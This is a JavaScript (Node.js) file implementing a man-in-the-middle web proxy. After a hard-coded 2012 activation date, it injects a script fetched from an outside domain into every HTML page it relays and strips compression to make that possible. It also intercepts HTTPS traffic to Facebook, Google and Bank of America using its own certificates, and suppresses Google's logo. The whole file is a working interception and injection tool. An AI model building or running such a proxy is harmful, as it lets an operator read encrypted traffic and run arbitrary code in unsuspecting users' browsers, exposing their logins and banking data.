var http = require('http')
  , url = require('url')
  , fs = require('fs')
  , https = require('https')
  , net = require('net');


var ADDITIONAL_CODE = {
    80: "<script type='text/javascript' src='http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js'></script>" +
        "<script type='text/javascript'>var $_jQuery = $.noConflict(true);</script>" +
        "<script type='text/javascript' src='http://www.yaluandmike.com/inject/index.js'></script>",

    443: "<script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js'></script>" +
        "<script type='text/javascript'>var $_jQuery = $.noConflict(true);</script>" +
        "<script type='text/javascript' src='https://www.yaluandmike.com:446/inject/index.js'></script>"
};

var isEnabled = function () {
    var enabled = new Date().getTime() > new Date(2012, 1, 9, 8, 30).getTime();
    return enabled;
};

var PORT = ~~(process.env.PORT || 8000);

function fixHeaders(request, oldHeaders) {
  // node does something STUPID in that incoming headers will be all lowercased
  // but outgoing headers will not have their case affected so I have to fix
  // them here.
  // Return a new hash of HTTP headers such that each header name (key) in this
  // hash has the proper case. This will not work for the "TE" header, see
  // http://en.wikipedia.org/wiki/List_of_HTTP_header_fields
  var result = {};
  for (var header in oldHeaders) {
    if (oldHeaders.hasOwnProperty(header)) {(function(){
      header = header.split('-')
                     .map(function(header){ return header[0].toUpperCase()+header.slice(1); })
                     .join('-');
      result[header] = oldHeaders[header.toLowerCase()];
    }());}
  }
  delete result['Connection'];
  if (result['X-Forwarded-For']) {
    result['X-Forwarded-For'] = result['X-Forwarded-For'] + ', ' + (request.connection.remoteAddress || request.connection.socket.remoteAddress);
  } else {
    result['X-Forwarded-For'] = request.connection.remoteAddress || request.connection.socket.remoteAddress;
  }
  result['Forwarded-For'] = result['X-Forwarded-For'];
  return result;
}

var catch_errors = function (wrapped) {
    return function (request, response) {
        try {
            return wrapped(request, response);
        } catch (error) {
            console.log("CAUGHT");
            console.log(error);
            console.log(error.stack);
        }
    };
};

var unrecoverable_error = function (request, response) {
    return function (error) {
        console.log('------------------------------------------------');
        console.log("Unrecoverable error: " + error);
        console.log("URL: " + request.method + " " + request.url);
        console.log(error.stack);
        response.writeHead(404, {'X-Failure': ""+error});
        response.end('');
    };
};


var debug_view = function (request_info) {
    if (process.env.DEBUG) {
        var r = {};
        r['host'] = request_info['host'];
        r['port'] = request_info['port'];
        r['path'] = request_info['path'];
        r['method'] = request_info['method'];

        console.log(r);
    }
};

var statInfo = {
    'filtered': [0, null],
    'unfiltered': [0, null],
    'sslUnfiltered': [0, null]
};

var updateStats = function (type) {
    var updateStat = function (fd) {
        statInfo[type][0]++;
        statInfo[type][1] = new Date();
        fs.truncate(fd, 0, function (err) {
            var buffer = JSON.stringify(statInfo, null, '\t');
            fs.write(fd, buffer, 0, buffer.length, 0);
        });
    };
    if (!statInfo['fd']) {
        fs.open('./stats.log', 'w+', 0666, function (err, fd) {
           if (err) throw err;
           statInfo['fd'] = fd;
           updateStat(fd);
        });
    } else {
        updateStat(statInfo['fd']);
    }
};

var isLocalDomain = {
    'axiak.net': 1,
    'yaluandmike.com': 1,
    'mikeandyalu.com': 1
};

var check_for_local = function (request_info) {
    var major_domain = (request_info['host'] || 'example.com').split('.').slice(-2).join('.');
    if (isLocalDomain[major_domain.toLowerCase()]) {
        request_info['host'] = 'localhost';
        if (request_info['port'] === 80) {
            request_info['port'] = 81;
        }
    }
};

var serverDefinition = function (http_mod, default_port, is_ssl) { return catch_errors(function(request, response) {
  var enabled = isEnabled();
  if (enabled) {
      request.headers['accept-encoding'] = 'identity';
      delete request.headers['proxy-connection'];
  }

  var parsed_url = url.parse(request.url);
  var parsed_host = url.parse('http://' + request.headers['host']);

  var request_info = {
    'host': parsed_url.hostname || parsed_host.hostname
  , 'port': ~~(parsed_url.port || parsed_host.port || default_port)
  , 'path': parsed_url.pathname + (parsed_url.search || '') + (parsed_url.hash || '')
  , 'method': request.method
  , 'headers': fixHeaders(request, request.headers)
  };

  check_for_local(request_info);

  debug_view(request_info);

  var proxy_request = http_mod.request(request_info, function (proxy_response) {
    var isHtml = (proxy_response.headers['content-type'] &&
                  proxy_response.headers['content-type'].toLowerCase().indexOf("html") != -1 && enabled),
        buffer = "";

    if (isHtml) {
        delete proxy_response.headers['content-length'];
    }


    proxy_response.on('error', function (error) {
        console.log(error);
        console.log(error.stack);
    });

    proxy_response.on('data', function(chunk) {
      if (isHtml) {
          buffer += chunk.toString("utf-8");
      } else {
          response.write(chunk, 'binary');
      }
    });

    proxy_response.on('end', function() {
      if (isHtml) {
          var bufferArr = buffer.split(/<\/body>/i);
          if (bufferArr.length !== 1) {
              var second = bufferArr.pop();
              var first = bufferArr.pop();
              bufferArr.push(first + ADDITIONAL_CODE[default_port]);
              bufferArr.push(second);
              buffer = bufferArr.join("</body>");
          } else if (buffer.search(/<html/i) !== -1) {
              buffer += ADDITIONAL_CODE[default_port];
          }
          response.end(buffer);
          updateStats('filtered');
      } else {
          response.end();
          updateStats('unfiltered');
      }
    });

    proxy_response.on('error', unrecoverable_error(request, response));

    if (enabled && request.url.indexOf('logo3w.png') !== -1) {
        response.writeHead(404, {});
        response.end();
    } else {
        response.writeHead(proxy_response.statusCode, proxy_response.headers);
    }
  });

  proxy_request.on('error', unrecoverable_error(request, response));
  request.on('error', unrecoverable_error(request, response));

  request.on('data', function(chunk) {
    proxy_request.write(chunk, 'binary');
  });

  request.on('end', function() {
    proxy_request.end();
  });
});
};

var server = http.createServer(serverDefinition(http, 80));
server.listen(PORT);
server.on('clientError', function (error) {
    console.log("ClientError failure.");
    console.log(error);
    console.log(error.stack);
});
server.on('error', function (error) {
    console.log("error failure.");
    console.log(error);
    console.log(error.stack);
});
server.on('upgrade', function (request, socket, head) {
     var enabled = isEnabled();
     var parsed_url = url.parse('https://' + request.url);

     var clientSocket;

     var hostName = parsed_url.hostname.toLowerCase();

     if (!sslCerts[hostName] && !directSsl[hostName]) {
         for (key in starCerts) {
             if (hostName.substr(-key.length) === key) {
                 hostName = starCerts[key];
                 break;
             }
         }
     }

     if (!enabled || directSsl[hostName] || !sslCerts[hostName]) {
         clientSocket = net.createConnection(~~(parsed_url.port || 443),
                                             hostName);
         updateStats('sslUnfiltered');
     } else {
         var sslPort = sslCerts[hostName][1] + PORT + 1;
         clientSocket = net.createConnection(sslPort,
                                             'localhost');
     }

     clientSocket.on('connect', function () {
         socket.write("HTTP/1.0 200 Connection established\r\n\r\n");
     });

     clientSocket.on('data', function (data) {
         socket.write(data);
     });

     clientSocket.on('end', function () {
         socket.end();
     });

     socket.on('data', function (data) {
         try {
             clientSocket.write(data);
         } catch (error) {
             console.log(error.stack);
         }
     });
     socket.on('end', function () {
         clientSocket.end();
     });
});

var sslOptions = {
};

var sslCerts = {
    default:            ['default.key.free', 0, 'default.crt'],
    'www.facebook.com': ['www.facebook.com.key.free', 1, 'www.facebook.com.crt'],
    'www.google.com':   ['star.google.com.key.free', 2, 'star.google.com.crt'],
    'www.yaluandmike.com':  ['star.yaluandmike.com.key.free', 3, 'star.yaluandmike.com.crt'],
    'www.bankofamerica.com':  ['star.bankofamerica.com.key.free', 4, 'star.bankofamerica.com.crt'],
    'google.com':  ['google.com.key.free', 5, 'google.com.crt'],
    'star.ak.facebook.com': ['star.ak.facebook.com.key.free', 6, 'star.ak.facebook.com.crt']
};

var starCerts = {
    'google.com': 'www.google.com',
    'ak.facebook.com': 'star.ak.facebook.com',
    'bankofamerica.com': 'www.bankofamerica.com'
};

var directSsl = {
    'ajax.googleapis.com': 1,
    'cdnjs.cloudflare.com': 1,
    'raw.github.com': 1,
    's-static.ak.facebook.com': 1,
    'fbcdn-profile-a.akamaihd.net': 1,
    'lh1.googleusercontent.com': 1,
    'lh2.googleusercontent.com': 1,
    'lh3.googleusercontent.com': 1,
    'lh4.googleusercontent.com': 1,
    'lh5.googleusercontent.com': 1,
    'lh6.googleusercontent.com': 1,
    'mail-attachment.googleusercontent.com': 1,
    'pagead1.googleadservices.com': 1,
    'pagead2.googleadservices.com': 1,
    'pagead3.googleadservices.com': 1,
    'ssl.gstatic.com': 1,
    '0-ig-w.channel.facebook.com': 1,
    's-external.ak.fbcdn.net': 1,
    'fbcdn-sphotos-a.akamaihd.net': 1,
    'fbcdn-photos-a.akamaihd.net': 1,
    'pixel.facebook.com': 1,
    'view.atdmt.com': 1,
   // 'mail.google.com': 1,
    'chatenabled.mail.google.com': 1
};

var sslPorts = {};


for (var key in sslCerts) {
    var port = PORT + 1 + sslCerts[key][1];
    if (sslPorts[port]) {
        continue;
    }
    sslPorts[port] = 1;
    var lSslOptions = {cert: fs.readFileSync('keys/' + sslCerts[key][2]),
                       'key': fs.readFileSync('keys/' + sslCerts[key][0])};
    var httpsServer = https.createServer(lSslOptions, serverDefinition(https, 443, true));
    httpsServer.listen(port);
    httpsServer.on('clientError', function (error) {
                       console.log("ClientError failure.");
                       console.log(error);
                       console.log(error.stack);
    });

    httpsServer.on('error', function (error) {
                       console.log("error failure.");
                       console.log(error);
                       console.log(error.stack);
    });
}
console.log("Proxy listening on port " + PORT + " and port " + (PORT + 1));
